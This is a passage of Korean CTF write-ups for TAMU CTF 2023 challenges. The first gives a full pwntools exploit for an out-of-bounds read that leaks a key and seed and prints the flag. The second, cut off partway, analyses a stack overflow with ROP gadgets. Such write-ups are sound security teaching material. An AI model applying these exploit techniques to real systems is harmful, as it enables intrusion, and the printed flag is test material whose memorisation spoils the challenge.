class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_LEN 30</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">upkeep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Not related to the challenge, just some stuff so the remote works correctly</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">char</span>* iv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[len];</span><br><span class="line">    FILE *file;</span><br><span class="line">    </span><br><span class="line">    file = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(key, len, <span class="number">1</span>, file);</span><br><span class="line">    fclose(file);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">randomize</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">long</span> seed, <span class="type">unsigned</span> <span class="type">long</span> iterations)</span> &#123;</span><br><span class="line">    seed = seed * iterations + len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iterations &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        randomize(msg, len, seed, iterations- <span class="number">1</span>); <span class="comment">// ì‹¤í–‰ì‹œì¼œì•¼ ìŠ¤íƒì´ ë†’ì•„ì ¸ì„œ print_hexí•  ë•Œ encryptí•¨ìˆ˜ì˜ key ê°’ì´ ë‚¨ì•„ìžˆìŒ</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        encrypt(msg, len, ((<span class="type">char</span> *) &amp;seed)); <span class="comment">// ì•ˆê·¸ëŸ¬ë©´ key ê°’ì´ ë®í˜€ì„œ ì•ˆë³´ìž„</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> option;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nSelect from the options below:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. Encrypt a message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. View the encrypted message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. Quit\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;option);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">console</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">long</span> seed;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> read_len;</span><br><span class="line">    <span class="type">char</span> buf[MAX_LEN] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(menu()) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="comment">// get user input</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter message to encrypt: &quot;</span>);</span><br><span class="line">                fgets(buf, MAX_LEN-FLAG_LEN, <span class="built_in">stdin</span>);</span><br><span class="line">                len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// add flag to the buffer</span></span><br><span class="line">                file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">                fread(buf + len, FLAG_LEN, <span class="number">1</span>, file);</span><br><span class="line">                fclose(file);</span><br><span class="line">                len += FLAG_LEN;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// encrypt</span></span><br><span class="line">                seed = ((<span class="type">long</span>) rand()) &lt;&lt; <span class="number">32</span> + rand();</span><br><span class="line">                randomize(buf, len, seed, buf[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span>(len == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you need to encrypt a message first.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                index = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nRead a substring of the encrypted message.&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter the starting index (%d - %d): &quot;</span>, index, len);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">                <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (index &gt; len) &#123; </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Error, index out of bounds.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your encrypted string with the flag:\n&quot;</span>);</span><br><span class="line">                print_hex(buf+index, len - index); <span class="comment">// oob read</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;goodbye.\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;There was an error processing that request, please try again.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>)); </span><br><span class="line">    upkeep();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// welcome</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my encryption engine: ENCRYPT-INATOR!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll encrypt anything you want but no guarantees you&#x27;ll be able to decrypt it,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I haven&#x27;t quite figured out how to do that yet... :(\n&quot;</span>); </span><br><span class="line">    console();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ë²ˆ ë©”ë‰´ì—ì„œ <code>index</code>ê°€ ìŒìˆ˜ê°€ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì— <code>print_hex(buf+index, len - index);</code>ì—ì„œ <code>oob</code>ê°€ ë°œìƒí•  ìˆ˜ ìžˆë‹¤. <code>buf</code> ì´ì „ì— ìžˆëŠ” ê²ƒì„ ì¶œë ¥í•  ìˆ˜ ìžˆë‹¤. ì´ê²ƒìœ¼ë¡œ <code>seed</code>ì™€ <code>key</code>ë¥¼ êµ¬í•  ìˆ˜ ìžˆë‹¤.</p><p>ì‚¬ì‹¤ìƒ <code>seed</code>ì™€ <code>key</code>ë§Œ ì•Œë©´ <code>flag</code>ëŠ” ë°”ë¡œ êµ¬í•  ìˆ˜ ìžˆì„ ê²ƒ ê°™ë‹¤. ì°¸ê³ ë¡œ encryptëœ flagë„ <code>print_hex(buf+index, len - index);</code>ë¥¼ í†µí•´ì„œ ë°”ë¡œ êµ¬í•  ìˆ˜ ìžˆê¸° ë•Œë¬¸ì— ë‹¹ì—°ížˆ <code>flag</code>ë¥¼ ê³„ì‚°í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">    msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>xor</code>ì„ í•œ ë²ˆ ë” ì§„í–‰í•˜ë©´ ëœë‹¤.</p><p><code>key</code>ë¥¼ leakí•  ë•Œ ì£¼ì˜í•´ì•¼í•  ê²ƒì´ ìžˆë‹¤. ì£¼ì„ì—ë„ ì¨ë†¨ë“¯ì´ <code>randomize()</code> í•¨ìˆ˜ì—ì„œ <code>iteration</code>ì´ 1 ì´ìƒì´ì–´ì•¼ <code>randomize(msg, len, seed, iterations- 1);</code> ì„ í•œ ë²ˆ ë” í˜¸ì¶œí•˜ëŠ”ë°, ì´ë ‡ê²Œ í•´ì•¼ì§€ stackì´ ë†’ì•„ì ¸ì„œ <code>key</code> ê°’ì´ ë‚¨ì•„ìžˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;encryptinator&quot;</span>) </span><br><span class="line"><span class="comment"># p = process(&#x27;./encryptinator&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./encryptinator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">7</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4800</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line">key_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key_leak&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key_leak))</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    key.append(<span class="built_in">int</span>(key_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4648</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">seed_leak = p.recvline()[:<span class="number">8</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed_leak))</span><br><span class="line"></span><br><span class="line">seed = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>):</span><br><span class="line">    seed.append(<span class="built_in">int</span>(seed_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">flag_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    flag.append(<span class="built_in">int</span>(flag_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    flag[i] = flag[i] ^ key[i] ^ seed[i % <span class="number">8</span>]</span><br><span class="line">    real_flag.append(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;####&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">&#x27;&#x27;</span>.join(real_flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(real_flag))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;00ps_b4d_3rr0r_ch3ck1ng&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Pwnme (pwn, sub rsp, 0x18)</title>
      <link href="/230503-tamu2023-8.Pwnme-pwn/"/>
      <url>/230503-tamu2023-8.Pwnme-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>pwn me. thatâ€™s it.<br>Author: <code>_mac_</code></p></blockquote><ul><li>[26 solves &#x2F; 494 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë°”ì´ë„ˆë¦¬ì™€ ì»¤ìŠ¤í…€ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì œê³µí•´ì¤€ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë¬¸ì œ ë°”ì´ë„ˆë¦¬ëŠ” ìœ„ì™€ ê°™ë‹¤. ì»¤ìŠ¤í…€ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ í•¨ìˆ˜ë¥¼ í•˜ë‚˜ í˜¸ì¶œí•´ì£¼ê³  ëë‚œë‹¤. <code>puts</code> ê°™ì€ ê²ƒë„ ì—†ì–´ì„œ ì •ë§ í•  ê²ƒì´ ì—†ë‹¤. </p><p>ì»¤ìŠ¤í…€ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ëŠ” ì•„ëž˜ í•¨ìˆ˜ê°€ ëì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pwn me&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x48</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì •ë§ í•  ê²ƒì´ ì•„ë¬´ê²ƒë„ ì•ˆë³´ì´ê³  ì½”ë“œê°€ ê°„ë‹¨í•´ì„œ ë­ í• ì§€ í•œì°¸ì„ ê³ ë¯¼í–ˆë‹¤. ì´ëŸ´ ë• ê°€ì ¯ì„ í•œë²ˆ ë´ì•¼í•œë‹¤. ê·¸ë¦¬ê³  <code>pwnme</code> í•¨ìˆ˜ì—ì„œ <code>read</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ ë ˆì§€ìŠ¤í„° ìƒí™©ë„ ë´ì£¼ëŠ” ê²ƒì´ ì¢‹ë‹¤. overflowê°€ ìƒê°ë³´ë‹¤ í¬ê²Œ ì•ˆë‚˜ê¸° ë•Œë¬¸ì— ë ˆì§€ìŠ¤í„° ê°’ì„ êµ³ì´ ì•ˆë°”ê¾¸ì–´ì¤˜ë„ ë˜ëŠ” ê²ƒì€ ì•ˆë°”ê¾¸ì–´ì£¼ê¸° ìœ„í•´ì„œì´ë‹¤.</p><ul><li>ë ˆì§€ìŠ¤í„° ìƒí™©</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rax</span>   : 0x48              </span><br><span class="line"><span class="variable">$rbx</span>   : 0x007fff6312c768  â†’  0x007fff6312d9b8  â†’  0x656d6e77702f2e (<span class="string">&quot;./pwnme&quot;</span>?)</span><br><span class="line"><span class="variable">$rcx</span>   : 0x007feb21b1f931  â†’  0x5777fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span><br><span class="line"><span class="variable">$rdx</span>   : 0x48              </span><br><span class="line"><span class="variable">$rsp</span>   : 0x007fff6312c630  â†’  0x00000000401185  â†’  &lt;__libc_csu_init+85&gt; pop rsp</span><br><span class="line"><span class="variable">$rbp</span>   : 0x6161616161616161 (<span class="string">&quot;aaaaaaaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rsi</span>   : 0x007fff6312c618  â†’  0x6161616161616161 (<span class="string">&quot;aaaaaaaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rdi</span>   : 0x0               </span><br><span class="line"><span class="variable">$rip</span>   : 0x007feb21c2e1fd  â†’  &lt;pwnme+54&gt; ret </span><br><span class="line"><span class="variable">$r8</span>    : 0x00000000401190  â†’  &lt;__libc_csu_fini+0&gt; ret </span><br><span class="line"><span class="variable">$r9</span>    : 0x007feb21c38d70  â†’   endbr64 </span><br><span class="line"><span class="variable">$r10</span>   : 0x007feb21a34bd0  â†’  0x000f001200001a3f</span><br><span class="line"><span class="variable">$r11</span>   : 0x246             </span><br><span class="line"><span class="variable">$r12</span>   : 0x0               </span><br><span class="line"><span class="variable">$r13</span>   : 0x007fff6312c778  â†’  0x007fff6312d9c0  â†’  <span class="string">&quot;SHELL=/bin/bash&quot;</span></span><br><span class="line"><span class="variable">$r14</span>   : 0x0               </span><br><span class="line"><span class="variable">$r15</span>   : 0x007feb21c67000  â†’  0x007feb21c682c0  â†’  0x0000000000000000</span><br><span class="line"><span class="variable">$eflags</span>: [zero CARRY PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00 </span><br></pre></td></tr></table></figure><ul><li>ì“¸ë§Œí•´ ë³´ì´ëŠ” ê°€ì ¯ë“¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401184: pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401186: pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401188: pop r14; pop r15; ret; </span><br><span class="line">0x000000000040118a: pop r15; ret; </span><br><span class="line">0x0000000000401183: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401187: pop rbp; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401109: pop rbp; ret; </span><br><span class="line">0x000000000040118b: pop rdi; ret; </span><br><span class="line">0x0000000000401189: pop rsi; pop r15; ret; </span><br><span class="line">0x0000000000401185: pop rsp; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401010: call rax; </span><br><span class="line">0x0000000000401191: mov rax, qword ptr [rdi]; ret; </span><br><span class="line">0x0000000000401192: mov eax, dwocrd ptr [rdi]; ret; </span><br><span class="line">0x00000000004011b2: sub rax, rsi; ret; </span><br></pre></td></tr></table></figure><h2 id="Worng-Idea"><a href="#Worng-Idea" class="headerlink" title="Worng Idea"></a>Worng Idea</h2><p>ì²˜ìŒì— ë­”ê°€ ìˆ˜ìƒí•œ ê°€ì ¯ë“¤ ë³´ê³  ì•„ëž˜ì™€ ê°™ì´ ì‹¤í–‰ì‹œí‚¤ê² ë‹¤ëŠ” ê°€ì„¤ì„ ì„¸ì› ë‹¤. <code>pwnme@got</code>ì™€ <code>win</code> í•¨ìˆ˜ì˜ ì˜¤í”„ì…‹ì„ êµ¬í•´ì„œ <code>libc leak</code> ì—†ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ ê²ƒì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 0x000000000040118b: pop rdi; ret; </span><br><span class="line">rdi = pwnme.got</span><br><span class="line">// mov 